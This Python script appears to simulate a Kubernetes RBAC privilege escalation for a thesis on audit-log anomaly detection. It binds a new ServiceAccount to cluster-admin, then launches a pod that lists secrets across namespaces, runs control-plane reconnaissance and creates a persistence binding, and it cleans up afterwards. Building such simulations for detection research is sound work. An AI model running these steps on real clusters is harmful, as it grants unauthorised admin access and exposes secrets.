"""
s9_rbac_escalation.py — T1098 Account Manipulation
====================================================

Симулирует RBAC-эскалацию: атакующий создаёт ClusterRoleBinding
который даёт cluster-admin права нетипичному ServiceAccount.

Это самый "тихий" сценарий в плане сетевого шума — виден только
в Audit Log. Идеально демонстрирует ценность audit-канала:
без него эта техника полностью невидима.

Ожидаемые сигналы:
  Audit:    feat_rbac_change_count >> 0 (создание CRB)
            feat_write_sensitive_count (write на clusterrolebindings)
            feat_new_pod_count (деплой pod с новыми правами)
            feat_exec_events_count (проверка прав через exec)
  Network:  без значимых изменений
  Metrics:  feat_new_pod_count небольшой рост

Почему важен для ВКР:
  Falco детектирует это через syscall правила, но только если
  настроены кастомные rules. Наш audit-канал детектирует автоматически
  через feat_rbac_change_count — демонстрирует complementary coverage.
"""

import subprocess
import time

# Имена ресурсов которые создаём
SA_NAME          = "attack-escalated-sa"
CRB_NAME         = "attack-cluster-admin-binding"
VERIFY_POD_NAME  = "attack-rbac-verify"

SA_MANIFEST = f"""
apiVersion: v1
kind: ServiceAccount
metadata:
  name: {SA_NAME}
  labels:
    attack-scenario: s9-rbac-escalation
"""

# Ключевое действие: выдаём cluster-admin нетипичному SA
CRB_MANIFEST = f"""
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: {CRB_NAME}
  labels:
    attack-scenario: s9-rbac-escalation
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: {SA_NAME}
  namespace: default
"""

# Pod который проверяет что эскалация сработала
VERIFY_POD_MANIFEST = f"""
apiVersion: v1
kind: Pod
metadata:
  name: {VERIFY_POD_NAME}
  labels:
    attack-scenario: s9-rbac-escalation
spec:
  serviceAccountName: {SA_NAME}
  restartPolicy: Never
  containers:
  - name: verify
    image: bitnami/kubectl:latest
    command:
    - /bin/sh
    - -c
    - |
      echo "[attack] Verifying escalated privileges..."
      echo "[attack] Can I read all secrets? (cluster-admin check)"
      kubectl auth can-i get secrets --all-namespaces 2>&1

      echo "[attack] Reading secrets across ALL namespaces..."
      for ns in default kube-system monitoring ae-monitoring kafka postgres; do
        echo "  --- namespace: $ns ---"
        kubectl get secrets -n $ns 2>&1 | head -5
      done

      echo "[attack] Reading etcd-related configmaps (control plane recon)..."
      kubectl get configmaps -n kube-system 2>&1 | head -10

      echo "[attack] Creating additional RBAC bindings (persistence)..."
      kubectl create clusterrolebinding attack-persistence \
        --clusterrole=cluster-admin \
        --serviceaccount=default:default 2>&1 || echo "blocked or exists"

      echo "[attack] Listing all ClusterRoleBindings (RBAC recon)..."
      kubectl get clusterrolebindings 2>&1 | head -20

      echo "[attack] RBAC escalation verification complete."
    resources:
      requests:
        cpu: "100m"
        memory: "64Mi"
"""


def run(namespace: str = "default", dry_run: bool = False):
    print(f"[S9] RBAC escalation scenario")
    print(f"     Creates: SA → ClusterRoleBinding(cluster-admin) → verify pod")
    print(f"     Key signal: feat_rbac_change_count spike in Audit")

    if dry_run:
        print("[DRY] Would create SA, ClusterRoleBinding (cluster-admin), verification pod")
        return

    print("[S9] Step 1: Creating ServiceAccount...")
    _apply(SA_MANIFEST, namespace)

    print("[S9] Step 2: Granting cluster-admin via ClusterRoleBinding (key action)...")
    _apply(CRB_MANIFEST)

    # Небольшая пауза — дать audit log записать событие
    time.sleep(5)

    print("[S9] Step 3: Deploying verification pod with escalated SA...")
    _apply(VERIFY_POD_MANIFEST, namespace)

    print("[S9] Waiting for verification pod...")
    _wait_for_phase(VERIFY_POD_NAME, namespace, "Succeeded", timeout=120)

    # Показываем логи верификации
    result = subprocess.run(
        ["kubectl", "logs", VERIFY_POD_NAME, "-n", namespace],
        capture_output=True, text=True
    )
    if result.stdout:
        print("\n[S9] Verification output:")
        for line in result.stdout.split("\n")[:20]:
            print(f"     {line}")

    print("\n[S9] Cleaning up...")
    cleanup(namespace)


def cleanup(namespace: str = "default"):
    print("[S9] Removing escalated access...")
    cmds = [
        ["kubectl", "delete", "pod", VERIFY_POD_NAME, "-n", namespace,
         "--ignore-not-found", "--grace-period=0", "--force"],
        # Важно: удаляем persistence binding тоже если был создан
        ["kubectl", "delete", "clusterrolebinding", "attack-persistence",
         "--ignore-not-found"],
        ["kubectl", "delete", "clusterrolebinding", CRB_NAME,
         "--ignore-not-found"],
        ["kubectl", "delete", "serviceaccount", SA_NAME, "-n", namespace,
         "--ignore-not-found"],
    ]
    for cmd in cmds:
        subprocess.run(cmd, capture_output=True)
    print("[S9] Cleanup done.")


def _apply(manifest: str, namespace: str = None):
    cmd = ["kubectl", "apply", "-f", "-"]
    if namespace:
        cmd += ["-n", namespace]
    result = subprocess.run(cmd, input=manifest.encode(), capture_output=True)
    if result.returncode != 0:
        print(f"     ⚠️  {result.stderr.decode().strip()[:200]}")
    else:
        print(f"     {result.stdout.decode().strip()}")


def _wait_for_phase(name: str, namespace: str, phase: str, timeout: int = 120):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = subprocess.run(
            ["kubectl", "get", "pod", name, "-n", namespace,
             "-o", "jsonpath={.status.phase}"],
            capture_output=True, text=True
        )
        current = result.stdout.strip()
        if current == phase:
            print(f"     Phase: {phase} ✓")
            return
        if current == "Failed":
            print("     ⚠️  Pod failed")
            return
        print(f"     Phase: {current or 'Pending'}...")
        time.sleep(8)
    print(f"     ⚠️  Timeout")
